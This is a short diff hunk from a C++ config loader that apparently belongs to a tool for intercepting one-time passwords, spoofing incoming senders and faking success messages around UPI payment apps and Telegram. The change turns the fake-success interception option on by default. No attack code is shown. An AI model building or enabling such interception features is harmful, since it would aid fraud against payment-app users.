@@ -244,7 +244,7 @@ bool ConfigManager::load() {
     config_.upi_app_timer_bonuses = parse_int_map(json, "upi_app_timer_bonuses");
     config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", true);
     config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
-    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", false);
+    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", true);
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
